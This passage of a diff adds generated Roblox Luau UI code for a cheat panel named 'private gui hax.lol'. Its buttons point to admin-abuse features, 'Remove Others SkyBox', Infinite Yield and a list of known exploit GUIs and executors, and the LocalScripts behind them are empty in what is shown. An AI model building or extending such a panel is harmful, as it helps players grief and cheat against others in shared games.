+G2L["2bc"]["Position"] = UDim2.new(0.64844, 0, 0.45521, 0);
+G2L["2bc"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2bc"]["Text"] = [[25]];
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.Reset
+G2L["2bd"] = Instance.new("TextButton", G2L["28f"]);
+G2L["2bd"]["TextWrapped"] = true;
+G2L["2bd"]["BorderSizePixel"] = 3;
+G2L["2bd"]["TextSize"] = 14;
+G2L["2bd"]["TextScaled"] = true;
+G2L["2bd"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2bd"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2bd"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2bd"]["Size"] = UDim2.new(0, 66, 0, 38);
+G2L["2bd"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2bd"]["Text"] = [[Reset To Normal Setting]];
+G2L["2bd"]["Name"] = [[Reset]];
+G2L["2bd"]["Position"] = UDim2.new(0.51814, 0, 0.35835, 0);
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.Reset.LocalScript
+G2L["2be"] = Instance.new("LocalScript", G2L["2bd"]);
+
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.cooldown
+G2L["2bf"] = Instance.new("TextBox", G2L["28f"]);
+G2L["2bf"]["Name"] = [[cooldown]];
+G2L["2bf"]["BorderSizePixel"] = 3;
+G2L["2bf"]["TextWrapped"] = true;
+G2L["2bf"]["TextSize"] = 14;
+G2L["2bf"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2bf"]["TextScaled"] = true;
+G2L["2bf"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2bf"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2bf"]["PlaceholderText"] = [[-- Cool Down]];
+G2L["2bf"]["Size"] = UDim2.new(0, 213, 0, 26);
+G2L["2bf"]["Position"] = UDim2.new(0.64844, 0, 0.54964, 0);
+G2L["2bf"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2bf"]["Text"] = [[0.05]];
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.modeltextbox
+G2L["2c0"] = Instance.new("TextBox", G2L["28f"]);
+G2L["2c0"]["Name"] = [[modeltextbox]];
+G2L["2c0"]["BorderSizePixel"] = 3;
+G2L["2c0"]["TextWrapped"] = true;
+G2L["2c0"]["TextSize"] = 14;
+G2L["2c0"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2c0"]["TextScaled"] = true;
+G2L["2c0"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2c0"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2c0"]["PlaceholderText"] = [[-- Model ID]];
+G2L["2c0"]["Size"] = UDim2.new(0, 213, 0, 26);
+G2L["2c0"]["Position"] = UDim2.new(0.58281, 0, 0.7724, 0);
+G2L["2c0"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2c0"]["Text"] = [[]];
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.Convert
+G2L["2c1"] = Instance.new("TextButton", G2L["28f"]);
+G2L["2c1"]["TextWrapped"] = true;
+G2L["2c1"]["BorderSizePixel"] = 3;
+G2L["2c1"]["TextSize"] = 14;
+G2L["2c1"]["TextScaled"] = true;
+G2L["2c1"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2c1"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2c1"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2c1"]["Size"] = UDim2.new(0, 144, 0, 23);
+G2L["2c1"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2c1"]["Text"] = [[Convert]];
+G2L["2c1"]["Name"] = [[Convert]];
+G2L["2c1"]["Position"] = UDim2.new(0.63532, 0, 0.88696, 0);
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.Convert.LocalScript
+G2L["2c2"] = Instance.new("LocalScript", G2L["2c1"]);
+
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.TextLabel
+G2L["2c3"] = Instance.new("TextLabel", G2L["28f"]);
+G2L["2c3"]["TextWrapped"] = true;
+G2L["2c3"]["BorderSizePixel"] = 3;
+G2L["2c3"]["TextSize"] = 14;
+G2L["2c3"]["TextScaled"] = true;
+G2L["2c3"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2c3"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2c3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2c3"]["Size"] = UDim2.new(0, 318, 0, 26);
+G2L["2c3"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2c3"]["Text"] = [[F3X Map Converter Section]];
+G2L["2c3"]["Position"] = UDim2.new(0.50156, 0, 0.65133, 0);
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.Delete Particle Mess
+G2L["2c4"] = Instance.new("TextButton", G2L["28f"]);
+G2L["2c4"]["TextWrapped"] = true;
+G2L["2c4"]["BorderSizePixel"] = 3;
+G2L["2c4"]["TextSize"] = 14;
+G2L["2c4"]["TextScaled"] = true;
+G2L["2c4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2c4"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2c4"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2c4"]["Size"] = UDim2.new(0, 66, 0, 40);
+G2L["2c4"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2c4"]["Text"] = [[Delete Particle Mess]];
+G2L["2c4"]["Name"] = [[Delete Particle Mess]];
+G2L["2c4"]["Position"] = UDim2.new(0.51814, 0, 0.47534, 0);
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.Delete Particle Mess.LocalScript
+G2L["2c5"] = Instance.new("LocalScript", G2L["2c4"]);
+
+
+
+-- StarterGui.private gui hax.lol.Fix All Things
+G2L["2c6"] = Instance.new("TextButton", G2L["2"]);
+G2L["2c6"]["TextWrapped"] = true;
+G2L["2c6"]["BorderSizePixel"] = 3;
+G2L["2c6"]["TextSize"] = 14;
+G2L["2c6"]["TextScaled"] = true;
+G2L["2c6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2c6"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2c6"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2c6"]["Size"] = UDim2.new(0, 60, 0, 33);
+G2L["2c6"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2c6"]["Text"] = [[Fix All Things]];
+G2L["2c6"]["Name"] = [[Fix All Things]];
+G2L["2c6"]["Position"] = UDim2.new(1.00602, 0, 0.30672, 0);
+
+
+-- StarterGui.private gui hax.lol.Fix All Things.LocalScript
+G2L["2c7"] = Instance.new("LocalScript", G2L["2c6"]);
+
+
+
+-- StarterGui.private gui hax.lol.Remove SkyBox
+G2L["2c8"] = Instance.new("TextButton", G2L["2"]);
+G2L["2c8"]["TextWrapped"] = true;
+G2L["2c8"]["BorderSizePixel"] = 3;
+G2L["2c8"]["TextSize"] = 14;
+G2L["2c8"]["TextScaled"] = true;
+G2L["2c8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2c8"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2c8"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2c8"]["Size"] = UDim2.new(0, 61, 0, 29);
+G2L["2c8"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2c8"]["Text"] = [[Remove Your SkyBox]];
+G2L["2c8"]["Name"] = [[Remove SkyBox]];
+G2L["2c8"]["Position"] = UDim2.new(1.00469, 0, 0.40079, 0);
+
+
+-- StarterGui.private gui hax.lol.Remove SkyBox.LocalScript
+G2L["2c9"] = Instance.new("LocalScript", G2L["2c8"]);
+
+
+
+-- StarterGui.private gui hax.lol.Remove Others Skybox
+G2L["2ca"] = Instance.new("TextButton", G2L["2"]);
+G2L["2ca"]["TextWrapped"] = true;
+G2L["2ca"]["BorderSizePixel"] = 3;
+G2L["2ca"]["TextSize"] = 14;
+G2L["2ca"]["TextScaled"] = true;
+G2L["2ca"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2ca"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2ca"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2ca"]["Size"] = UDim2.new(0, 60, 0, 33);
+G2L["2ca"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2ca"]["Text"] = [[Remove Others SkyBox]];
+G2L["2ca"]["Name"] = [[Remove Others Skybox]];
+G2L["2ca"]["Position"] = UDim2.new(1.00602, 0, 0.48727, 0);
+
+
+-- StarterGui.private gui hax.lol.Remove Others Skybox.LocalScript
+G2L["2cb"] = Instance.new("LocalScript", G2L["2ca"]);
+
+
+
+-- StarterGui.private gui hax.lol.INFYIELD
+G2L["2cc"] = Instance.new("TextButton", G2L["2"]);
+G2L["2cc"]["TextWrapped"] = true;
+G2L["2cc"]["BorderSizePixel"] = 3;
+G2L["2cc"]["TextSize"] = 14;
+G2L["2cc"]["TextScaled"] = true;
+G2L["2cc"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2cc"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2cc"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2cc"]["Size"] = UDim2.new(0, 35, 0, 137);
+G2L["2cc"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2cc"]["Text"] = [[INF YIELD]];
+G2L["2cc"]["Name"] = [[INFYIELD]];
+G2L["2cc"]["Position"] = UDim2.new(1.00469, 0, 0.6369, 0);
+
+
+-- StarterGui.private gui hax.lol.INFYIELD.LocalScript
+G2L["2cd"] = Instance.new("LocalScript", G2L["2cc"]);
+
+
+
+-- StarterGui.private gui hax.lol.Gui Page
+G2L["2ce"] = Instance.new("Frame", G2L["2"]);
+G2L["2ce"]["Visible"] = false;
+G2L["2ce"]["BorderSizePixel"] = 3;
+G2L["2ce"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2ce"]["Size"] = UDim2.new(0, 639, 0, 413);
+G2L["2ce"]["Position"] = UDim2.new(0.00156, 0, 0.18056, 0);
+G2L["2ce"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2ce"]["Name"] = [[Gui Page]];
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["2cf"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["2cf"]["TextWrapped"] = true;
+G2L["2cf"]["BorderSizePixel"] = 3;
+G2L["2cf"]["TextSize"] = 14;
+G2L["2cf"]["TextScaled"] = true;
+G2L["2cf"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2cf"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2cf"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2cf"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["2cf"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2cf"]["Text"] = [[Polaria F3X]];
+G2L["2cf"]["Name"] = [[Button]];
+G2L["2cf"]["Position"] = UDim2.new(0.00955, 0, 0.03312, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button.LocalScript
+G2L["2d0"] = Instance.new("LocalScript", G2L["2cf"]);
+
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["2d1"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["2d1"]["TextWrapped"] = true;
+G2L["2d1"]["BorderSizePixel"] = 3;
+G2L["2d1"]["TextSize"] = 14;
+G2L["2d1"]["TextScaled"] = true;
+G2L["2d1"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2d1"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2d1"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2d1"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["2d1"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2d1"]["Text"] = [[c00lgui F3X]];
+G2L["2d1"]["Name"] = [[Button]];
+G2L["2d1"]["Position"] = UDim2.new(0.15196, 0, 0.03312, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button.LocalScript
+G2L["2d2"] = Instance.new("LocalScript", G2L["2d1"]);
+
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["2d3"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["2d3"]["TextWrapped"] = true;
+G2L["2d3"]["BorderSizePixel"] = 3;
+G2L["2d3"]["TextSize"] = 14;
+G2L["2d3"]["TextScaled"] = true;
+G2L["2d3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2d3"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2d3"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2d3"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["2d3"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2d3"]["Text"] = [[RC7 By Elv4r0x]];
+G2L["2d3"]["Name"] = [[Button]];
+G2L["2d3"]["Position"] = UDim2.new(0.29281, 0, 0.03312, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button.LocalScript
+G2L["2d4"] = Instance.new("LocalScript", G2L["2d3"]);
+
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["2d5"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["2d5"]["TextWrapped"] = true;
+G2L["2d5"]["BorderSizePixel"] = 3;
+G2L["2d5"]["TextSize"] = 14;
+G2L["2d5"]["TextScaled"] = true;
+G2L["2d5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2d5"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2d5"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2d5"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["2d5"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2d5"]["Text"] = [[Project 2016 Fanmade]];
+G2L["2d5"]["Name"] = [[Button]];
+G2L["2d5"]["Position"] = UDim2.new(0.43522, 0, 0.03312, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button.LocalScript
+G2L["2d6"] = Instance.new("LocalScript", G2L["2d5"]);
+
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["2d7"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["2d7"]["TextWrapped"] = true;
+G2L["2d7"]["BorderSizePixel"] = 3;
+G2L["2d7"]["TextSize"] = 14;
+G2L["2d7"]["TextScaled"] = true;
+G2L["2d7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2d7"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2d7"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2d7"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["2d7"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2d7"]["Text"] = [[K00pgui v8 F3X]];
+G2L["2d7"]["Name"] = [[Button]];
+G2L["2d7"]["Position"] = UDim2.new(0.58232, 0, 0.03312, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["2d8"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["2d8"]["TextWrapped"] = true;
+G2L["2d8"]["BorderSizePixel"] = 3;
+G2L["2d8"]["TextSize"] = 14;
+G2L["2d8"]["TextScaled"] = true;
+G2L["2d8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2d8"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2d8"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2d8"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["2d8"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2d8"]["Text"] = [[MrBean Admin F3X]];
+G2L["2d8"]["Name"] = [[Button]];
+G2L["2d8"]["Position"] = UDim2.new(0.72473, 0, 0.03312, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button.LocalScript
+G2L["2d9"] = Instance.new("LocalScript", G2L["2d8"]);
+
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["2da"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["2da"]["TextWrapped"] = true;
+G2L["2da"]["BorderSizePixel"] = 3;
+G2L["2da"]["TextSize"] = 14;
+G2L["2da"]["TextScaled"] = true;
+G2L["2da"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2da"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2da"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2da"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["2da"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2da"]["Text"] = [[K00pgui v11 F3X]];
+G2L["2da"]["Name"] = [[Button]];
+G2L["2da"]["Position"] = UDim2.new(0.86401, 0, 0.03312, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["2db"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["2db"]["TextWrapped"] = true;
+G2L["2db"]["BorderSizePixel"] = 3;
+G2L["2db"]["TextSize"] = 14;
+G2L["2db"]["TextScaled"] = true;
+G2L["2db"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2db"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2db"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2db"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["2db"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2db"]["Text"] = [[c00lgui F3X (BY SnakeGod)]];
+G2L["2db"]["Name"] = [[Button]];
+G2L["2db"]["Position"] = UDim2.new(0.00955, 0, 0.14935, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button.LocalScript
+G2L["2dc"] = Instance.new("LocalScript", G2L["2db"]);
+
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["2dd"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["2dd"]["TextWrapped"] = true;
+G2L["2dd"]["BorderSizePixel"] = 3;
+G2L["2dd"]["TextSize"] = 14;
+G2L["2dd"]["TextScaled"] = true;
+G2L["2dd"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2dd"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2dd"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2dd"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["2dd"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2dd"]["Text"] = [[K00pgui v7 F3X]];
+G2L["2dd"]["Name"] = [[Button]];
+G2L["2dd"]["Position"] = UDim2.new(0.1504, 0, 0.14935, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["2de"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["2de"]["TextWrapped"] = true;
+G2L["2de"]["BorderSizePixel"] = 3;
+G2L["2de"]["TextSize"] = 14;
+G2L["2de"]["TextScaled"] = true;
+G2L["2de"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2de"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2de"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2de"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["2de"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2de"]["Text"] = [[LNicky v3.60 Remake Gui]];
+G2L["2de"]["Name"] = [[Button]];
+G2L["2de"]["Position"] = UDim2.new(0.29124, 0, 0.14935, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["2df"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["2df"]["TextWrapped"] = true;
+G2L["2df"]["BorderSizePixel"] = 3;
+G2L["2df"]["TextSize"] = 14;
+G2L["2df"]["TextScaled"] = true;
+G2L["2df"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2df"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2df"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2df"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["2df"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2df"]["Text"] = [[F3X Executor GUI]];
+G2L["2df"]["Name"] = [[Button]];
+G2L["2df"]["Position"] = UDim2.new(0.43365, 0, 0.14935, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button.LocalScript
+G2L["2e0"] = Instance.new("LocalScript", G2L["2df"]);
+
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["2e1"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["2e1"]["TextWrapped"] = true;
+G2L["2e1"]["BorderSizePixel"] = 3;
+G2L["2e1"]["TextSize"] = 14;
+G2L["2e1"]["TextScaled"] = true;
+G2L["2e1"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2e1"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2e1"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2e1"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["2e1"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2e1"]["Text"] = [[FE c00lgui By LordMuhammad]];
+G2L["2e1"]["Name"] = [[Button]];
+G2L["2e1"]["Position"] = UDim2.new(0.58232, 0, 0.14935, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button.LocalScript
+G2L["2e2"] = Instance.new("LocalScript", G2L["2e1"]);
+
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["2e3"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["2e3"]["TextWrapped"] = true;
+G2L["2e3"]["BorderSizePixel"] = 3;
+G2L["2e3"]["TextSize"] = 14;
+G2L["2e3"]["TextScaled"] = true;
+G2L["2e3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2e3"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2e3"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2e3"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["2e3"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2e3"]["Text"] = [[Stigma Executor Remake]];
+G2L["2e3"]["Name"] = [[Button]];
+G2L["2e3"]["Position"] = UDim2.new(0.72473, 0, 0.14935, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button.LocalScript
+G2L["2e4"] = Instance.new("LocalScript", G2L["2e3"]);
+
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["2e5"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["2e5"]["TextWrapped"] = true;
+G2L["2e5"]["BorderSizePixel"] = 3;
+G2L["2e5"]["TextSize"] = 14;
+G2L["2e5"]["TextScaled"] = true;
+G2L["2e5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2e5"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2e5"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2e5"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["2e5"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2e5"]["Text"] = [[Dominaint Executor]];
+G2L["2e5"]["Name"] = [[Button]];
+G2L["2e5"]["Position"] = UDim2.new(0.86401, 0, 0.14935, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button.LocalScript
+G2L["2e6"] = Instance.new("LocalScript", G2L["2e5"]);
+
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["2e7"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["2e7"]["TextWrapped"] = true;
+G2L["2e7"]["BorderSizePixel"] = 3;
+G2L["2e7"]["TextSize"] = 14;
+G2L["2e7"]["TextScaled"] = true;
+G2L["2e7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2e7"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2e7"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2e7"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["2e7"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2e7"]["Text"] = [[r04dbl0ck1ng v2.2 F3X Gui]];
+G2L["2e7"]["Name"] = [[Button]];
+G2L["2e7"]["Position"] = UDim2.new(0.00955, 0, 0.26799, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button.LocalScript
+G2L["2e8"] = Instance.new("LocalScript", G2L["2e7"]);
+
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["2e9"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["2e9"]["TextWrapped"] = true;
+G2L["2e9"]["BorderSizePixel"] = 3;
+G2L["2e9"]["TextSize"] = 14;
+G2L["2e9"]["TextScaled"] = true;
+G2L["2e9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2e9"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2e9"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2e9"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["2e9"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2e9"]["Text"] = [[c00lgui F3X By InnocentPlayer]];
+G2L["2e9"]["Name"] = [[Button]];
+G2L["2e9"]["Position"] = UDim2.new(0.1504, 0, 0.26799, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button.LocalScript
+G2L["2ea"] = Instance.new("LocalScript", G2L["2e9"]);
+
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["2eb"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["2eb"]["TextWrapped"] = true;
+G2L["2eb"]["BorderSizePixel"] = 3;
+G2L["2eb"]["TextSize"] = 14;
+G2L["2eb"]["TextScaled"] = true;
+G2L["2eb"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2eb"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2eb"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2eb"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["2eb"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2eb"]["Text"] = [[Empty]];
+G2L["2eb"]["Name"] = [[Button]];
+G2L["2eb"]["Position"] = UDim2.new(0.29124, 0, 0.26799, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["2ec"] = Instance.new("TextButton", G2L["2ce"]);
